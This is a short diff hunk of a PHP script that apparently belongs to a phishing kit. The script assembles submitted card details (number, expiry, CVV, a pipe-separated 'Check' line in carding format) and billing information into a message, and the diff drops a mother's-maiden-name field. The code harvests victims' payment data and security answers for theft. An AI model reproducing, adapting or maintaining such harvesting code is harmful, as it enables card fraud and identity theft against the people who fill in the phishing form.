@@ -19,7 +19,6 @@ $message .= "CardHolder  : ".$_POST['holder']."\n";
 $message .= "CC Number	 : ".$cc."\n";
 $message .= "Exp         : ".$_POST['month']."/".$_POST['year']."\n";
 $message .= "Cvv         : ".$_POST['cvv']."\n";
-$message .= "Mother's Maiden Name         : ".$_POST['mmn']."\n";
 $message .= "Check       : ".$cc."|".$_POST['month']."|".$_POST['year']."|".$_POST['cvv']."\n";
 $message .= "#------------------[ Billing Information ]----------------#\n";
 $message .= "Full Name   : ".$_POST['fname']."\n";
